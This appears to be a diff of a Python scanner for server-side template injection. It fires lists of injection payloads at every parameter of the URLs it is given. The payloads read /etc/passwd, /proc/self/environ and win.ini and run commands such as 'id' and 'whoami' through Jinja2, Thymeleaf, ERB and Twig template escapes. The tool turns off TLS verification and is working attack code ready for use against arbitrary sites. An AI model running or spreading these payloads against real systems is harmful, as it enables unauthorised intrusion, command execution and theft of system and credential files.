@@ -2,12 +2,14 @@
 
 import argparse
 import requests
-from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+import threading
+from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, unquote
 from colorama import Fore, Style, init
 import concurrent.futures
 import urllib3
-import time
-import urllib.parse
+import re
+import sys
+import logging
 
 # Initialize colorama for colored output
 init(autoreset=True)
@@ -15,80 +17,108 @@ init(autoreset=True)
 # Suppress SSL warnings
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# Define SSTI payloads with diverse variations
-ssti_payloads = [
-    # Simple Arithmetic Expressions
-    {"payload": "{{7*7}}", "keyword": "49"},
-    {"payload": "{{756*6}}", "keyword": "4548"},
-    {"payload": "{{9*9}}", "keyword": "81"},
-    {"payload": "{{'a'+'b'+'huihui'}}", "keyword": "abhuihui"},
-    
-    # Encoded Payloads
-    {"payload": "%7B%7B7*7%7D%7D", "keyword": "49"},  # URL-encoded {{7*7}}
-    {"payload": "{{'{{7*7*7}}'}}", "keyword": "343"},  # Nested templates
-    
-    # Accessing Configuration and Objects
-    {"payload": "{{ config.items() }}", "keyword": "config"},
-    {"payload": "{{ request.method }}", "keyword": "GET"},
-    {"payload": "{{ user }}", "keyword": "user"},
-    {"payload": "{{ session }}", "keyword": "session"},
-    
-    # Method Chaining and Class Hierarchy
-    {"payload": "{{ ''.__class__.__mro__[1].__subclasses__() }}", "keyword": "subclasses"},
-    {"payload": "{{ ''.__class__.__mro__[2].__subclasses__() }}", "keyword": "subclasses"},
-    {"payload": "{{ ''.__class__.__base__ }}", "keyword": "str"},
-    
-    # File Access and Data Leakage
-    {"payload": "{{ ''.__class__.__mro__[1].__subclasses__()[40]('etc/passwd').read() }}", "keyword": "root:x:0:0:"},
-    {"payload": "{{ ''.__class__.__mro__[1].__subclasses__()[40]('C:\\Windows\\win.ini').read() }}", "keyword": "[fonts]"},
-    {"payload": "{{ ''.__class__.__mro__[1].__subclasses__()[40]('/proc/self/environ').read() }}", "keyword": "PATH="},
-    
+# Configure logging
+logging.basicConfig(
+    filename='ssti_scanner.log',
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s'
+)
+
+# Lock for thread-safe print and file operations
+print_lock = threading.Lock()
+file_lock = threading.Lock()
+
+# Payloads with their expected response indicators (using regular expressions)
+payloads = [
+    # Simple arithmetic expressions to test evaluation
+    {"payload": "{{7*7}}", "regex": r"49"},
+    {"payload": "${7*7}", "regex": r"49"},
+    {"payload": "#{7*7}", "regex": r"49"},
+    {"payload": "<%=7*7%>", "regex": r"49"},
+    {"payload": "${{7*7}}", "regex": r"49"},
+    # String concatenation
+    {"payload": "{{'a'+'b'}}", "regex": r"ab"},
+    {"payload": "${'a'+'b'}", "regex": r"ab"},
+    {"payload": "#{'a'+'b'}", "regex": r"ab"},
+    {"payload": "<%='a'+'b'%>", "regex": r"ab"},
+    # Length of a string
+    {"payload": "{{'ab'|length}}", "regex": r"2"},
+    {"payload": "${'ab'.length()}", "regex": r"2"},
+    {"payload": "#{'ab'.length()}", "regex": r"2"},
+    # Testing built-in variables
+    {"payload": "{{config.debug}}", "regex": r"True|False"},
+    {"payload": "{{request.method}}", "regex": r"GET|POST"},
+    {"payload": "${request.method}", "regex": r"GET|POST"},
+    # Encoded payloads
+    {"payload": "%7B%7B7*7%7D%7D", "regex": r"49"},  # Encoded {{7*7}}
+    {"payload": "%24%7B7*7%7D", "regex": r"49"},     # Encoded ${7*7}
+    # Malformed payloads to bypass filters
+    {"payload": "{{7*'7'}}", "regex": r"7777777"},
+    {"payload": "{{7*7.0}}", "regex": r"49\.0"},
+    {"payload": "{%7B7*7%7D}", "regex": r"49"},      # Encoded with braces
+    # Testing for error messages
+    {"payload": "{{", "regex": r"TemplateSyntaxError|Exception|Error"},
+    {"payload": "{%", "regex": r"TemplateSyntaxError|Exception|Error"},
+    # Checking for variable handling
+    {"payload": "{{123}}", "regex": r"123"},
+    {"payload": "${123}", "regex": r"123"},
+    {"payload": "#{123}", "regex": r"123"},
+    # Advanced payloads for file reading and command execution
+    # File Access
+    {"payload": "{{ ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() }}", "regex": r"root:x:0:0:"},
+    {"payload": "{{ ''.__class__.__mro__[1].__subclasses__()[40]('C:\\\\Windows\\\\win.ini').read() }}", "regex": r"\[fonts\]"},
+    {"payload": "{{ ''.__class__.__mro__[1].__subclasses__()[40]('/proc/self/environ').read() }}", "regex": r"PATH="},
     # Command Execution
-    {"payload": "{{ ''.__class__.__mro__[1].__subclasses__()[396]('id').read() }}", "keyword": "uid="},
-    {"payload": "{{ ''.__class__.__mro__[1].__subclasses__()[396]('whoami').read() }}", "keyword": "root"},
-    {"payload": "{{ ''.__class__.__mro__[1].__subclasses__()[396]('uname -a').read() }}", "keyword": "Linux"},
-    
+    {"payload": "{{ ''.__class__.__mro__[1].__subclasses__()[59].__init__.__globals__['os'].popen('id').read() }}", "regex": r"uid=\d+"},
+    {"payload": "{{ ''.__class__.__mro__[1].__subclasses__()[59]('id',shell=True,stdout=-1).communicate()[0].decode() }}", "regex": r"uid=\d+"},
+    {"payload": "{{ ''.__class__.__mro__[1].__subclasses__()[59]('whoami',shell=True,stdout=-1).communicate()[0].decode() }}", "regex": r"\w+"},
     # Engine-Specific Payloads
     # Jinja2 (Python)
-    {"payload": "{{7*7}}", "keyword": "49"},
-    {"payload": "{{config.items()}}", "keyword": "config"},
-    {"payload": "{{ ''.__class__.__mro__[1].__subclasses__() }}", "keyword": "subclasses"},
-    
+    {"payload": "{{ self.__init__.__globals__.__builtins__.open('/etc/passwd').read() }}", "regex": r"root:x:0:0:"},
+    {"payload": "{{ config.from_pyfile('/etc/passwd') }}", "regex": r"root:x:0:0:"},
     # Thymeleaf (Java)
-    {"payload": "#{7*7}", "keyword": "49"},
-    {"payload": "#{T(java.lang.Runtime).getRuntime().exec('id')}", "keyword": "uid="},
-    
+    {"payload": "${T(java.lang.Runtime).getRuntime().exec('id')}", "regex": r"uid=\d+"},
+    {"payload": "${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}", "regex": r"root:x:0:0:"},
     # ERB (Ruby)
-    {"payload": "<%=7*7%>", "keyword": "49"},
-    {"payload": "<%= `id` %>", "keyword": "uid="},
-    
+    {"payload": "<%= `id` %>", "regex": r"uid=\d+"},
+    {"payload": "<%= File.open('/etc/passwd').read %>", "regex": r"root:x:0:0:"},
     # Twig (PHP)
-    {"payload": "{{7*7}}", "keyword": "49"},
-    {"payload": "{{ source('php://filter/convert.base64-encode/resource=index') }}", "keyword": "PD9waHANCg=="},  # Base64-encoded "<?php"
-    
-    # Additional Complex Payloads with Bit Variations
-    {"payload": "{{ ''.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__['os'].popen('id').read() }}", "keyword": "uid="},
-    {"payload": "{{ ''.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__['subprocess'].check_output(['id']) }}", "keyword": "uid="},
-    {"payload": "{{ ''.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__['os'].system('id') }}", "keyword": ""},
-    {"payload": "{{ ''.__class__.__mro__[1].__subclasses__()[40].__init__.__globals__['subprocess'].Popen(['id'], stdout=subprocess.PIPE).stdout.read() }}", "keyword": "uid="},
+    {"payload": "{{ system('id') }}", "regex": r"uid=\d+"},
+    {"payload": "{{ include('/etc/passwd') }}", "regex": r"root:x:0:0:"},
+    # Additional Complex Payloads
+    {"payload": "{{''.class.mro[1].subclasses()[396]('id').read()}}", "regex": r"uid=\d+"},
+    {"payload": "{{''.class.mro[1].subclasses()[396]('cat /etc/passwd').read()}}", "regex": r"root:x:0:0:"},
+    # Null byte injection
+    {"payload": "{{7*7}}\x00", "regex": r"49"},
 ]
 
 def parse_arguments():
-    parser = argparse.ArgumentParser(description="Automate SSTI testing with payload variations.")
+    """
+    Parse command-line arguments.
+    """
+    parser = argparse.ArgumentParser(description="Automated SSTI Vulnerability Scanner.")
     parser.add_argument("-i", "--input", required=True, help="Input file with URLs")
     parser.add_argument("-o", "--output", required=True, help="Output file for vulnerable URLs")
     parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads (default: 10)")
+    parser.add_argument("-v", "--verbose", action='store_true', help="Enable verbose output")
+    parser.add_argument("--timeout", type=int, default=15, help="Request timeout in seconds (default: 15)")
     return parser.parse_args()
 
 def load_urls(file_path):
+    """
+    Load URLs from the input file.
+    """
     try:
         with open(file_path, "r") as f:
             return [line.strip() for line in f if line.strip()]
     except FileNotFoundError:
         print(f"{Fore.RED}Error: Input file '{file_path}' not found.")
-        exit(1)
+        sys.exit(1)
 
-def inject_payload(url, param, payload):
+def inject_payload(url, param, payload, timeout):
+    """
+    Inject payload into the URL parameter and send the request.
+    """
     try:
         parsed_url = urlparse(url)
         params = parse_qs(parsed_url.query)
@@ -96,99 +126,84 @@ def inject_payload(url, param, payload):
         params[param] = payload
         new_query = urlencode(params, doseq=True)
         injected_url = urlunparse(parsed_url._replace(query=new_query))
-        response = requests.get(injected_url, timeout=10, verify=False, allow_redirects=True)
+        response = requests.get(injected_url, timeout=timeout, verify=False, allow_redirects=True)
         return response.text, injected_url
     except requests.exceptions.RequestException as e:
-        print(f"{Fore.YELLOW}Error requesting {url}: {e}")
+        logging.error(f"Error requesting {url}: {e}")
         return "", None
 
-def inject_payload_with_time(url, param, payload):
-    try:
-        parsed_url = urlparse(url)
-        params = parse_qs(parsed_url.query)
-        # Replace the parameter with the payload
-        params[param] = payload
-        new_query = urlencode(params, doseq=True)
-        injected_url = urlunparse(parsed_url._replace(query=new_query))
-        start_time = time.time()
-        response = requests.get(injected_url, timeout=15, verify=False, allow_redirects=True)
-        end_time = time.time()
-        elapsed_time = end_time - start_time
-        return response.text, (elapsed_time > 5), injected_url  # Threshold set to 5 seconds
-    except requests.exceptions.RequestException as e:
-        print(f"{Fore.YELLOW}Error requesting {url}: {e}")
-        return "", False, None
+def analyze_response(response_text, regexes):
+    """
+    Analyze the response text for the given regex patterns.
+    """
+    for regex in regexes:
+        pattern = re.compile(regex, re.IGNORECASE)
+        if pattern.search(response_text):
+            # Extract context around the match
+            match = pattern.search(response_text)
+            context_size = 40
+            start = max(match.start() - context_size, 0)
+            end = min(match.end() + context_size, len(response_text))
+            context = response_text[start:end]
+            return True, context
+    return False, ""
 
-def analyze_response(response_text, expected_keyword):
-    return expected_keyword in response_text
-
-def decode_payload(payload):
-    try:
-        return urllib.parse.unquote(payload)
-    except:
-        return payload
-
-def select_payloads(url):
-    # Placeholder for logic to select payloads based on the URL or detected engine
-    # Currently returns all payloads
-    return ssti_payloads
-
-def test_url(url):
-    vulnerable = False
+def test_url(url, timeout, verbose):
+    """
+    Test a single URL for SSTI vulnerabilities.
+    """
     parsed_url = urlparse(url)
     params = parse_qs(parsed_url.query)
     if not params:
-        # No parameters to test
-        print(f"{Fore.YELLOW}No parameters found in URL: {url}")
+        with print_lock:
+            print(f"{Fore.YELLOW}No parameters found in URL: {url}")
         return None
 
     for param in params:
-        for payload_entry in select_payloads(url):
+        for payload_entry in payloads:
             payload = payload_entry["payload"]
-            keyword = payload_entry["keyword"]
+            regexes = [payload_entry["regex"]]
+            decoded_payload = unquote(payload)
 
-            # Determine if the payload is time-based (contains 'sleep' or 'time')
-            is_time_based = False
-            if "sleep" in payload.lower() or "time" in payload.lower():
-                is_time_based = True
+            response_text, injected_url = inject_payload(url, param, payload, timeout)
+            if not response_text:
+                continue  # Skip if no response was received
 
-            if is_time_based:
-                response_text, is_delayed, injected_url = inject_payload_with_time(url, param, payload)
-                if is_delayed:
-                    vulnerable = True
-                    print(f"{Fore.GREEN}Vulnerable (Time-Based): {url} [Param: {param}, Payload: {payload}]")
-                    if injected_url:
-                        print(f"{Fore.GREEN}Injected URL: {injected_url}")
-                    return url  # Stop after first vulnerability detected
-            else:
-                # Handle encoded payloads
-                decoded_payload = decode_payload(payload)
-                response_text, injected_url = inject_payload(url, param, payload)
-                if analyze_response(response_text, keyword):
-                    vulnerable = True
-                    print(f"{Fore.GREEN}Vulnerable: {url} [Param: {param}, Payload: {payload}]")
-                    if injected_url:
-                        print(f"{Fore.GREEN}Injected URL: {injected_url}")
-                    return url  # Stop after first vulnerability detected
-                else:
-                    continue
-    if not vulnerable:
-        print(f"{Fore.RED}Not Vulnerable: {url}")
+            detected, context = analyze_response(response_text, regexes)
+            if detected:
+                with print_lock:
+                    print(f"{Fore.GREEN}[VULNERABLE] {url}")
+                    print(f"Parameter: {param}")
+                    print(f"Payload: {decoded_payload}")
+                    print(f"Injected URL: {injected_url}")
+                    if verbose:
+                        print(f"Context: ...{context}...")
+                    print("-" * 80)
+                return url  # Stop after first vulnerability detected
+        # If no payloads triggered a response, continue to next parameter
+    with print_lock:
+        print(f"{Fore.RED}[NOT VULNERABLE] {url}")
     return None
 
 def main():
+    """
+    Main function to orchestrate the scanning.
+    """
     args = parse_arguments()
     urls = load_urls(args.input)
     vulnerable_urls = []
 
     if not urls:
         print(f"{Fore.RED}Error: No URLs found in the input file.")
-        exit(1)
+        sys.exit(1)
 
     print(f"{Fore.CYAN}Starting SSTI testing with {len(urls)} URLs using {args.threads} threads...\n")
 
     with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor:
-        future_to_url = {executor.submit(test_url, url): url for url in urls}
+        future_to_url = {
+            executor.submit(test_url, url, args.timeout, args.verbose): url
+            for url in urls
+        }
         for future in concurrent.futures.as_completed(future_to_url):
             result = future.result()
             if result:
@@ -197,9 +212,10 @@ def main():
     # Write vulnerable URLs to output file
     if vulnerable_urls:
         try:
-            with open(args.output, "w") as f:
-                for vuln_url in vulnerable_urls:
-                    f.write(f"{vuln_url}\n")
+            with file_lock:
+                with open(args.output, "w") as f:
+                    for vuln_url in vulnerable_urls:
+                        f.write(f"{vuln_url}\n")
             print(f"\n{Fore.CYAN}Vulnerable URLs have been saved to '{args.output}'")
         except Exception as e:
             print(f"{Fore.RED}Error writing to output file '{args.output}': {e}")
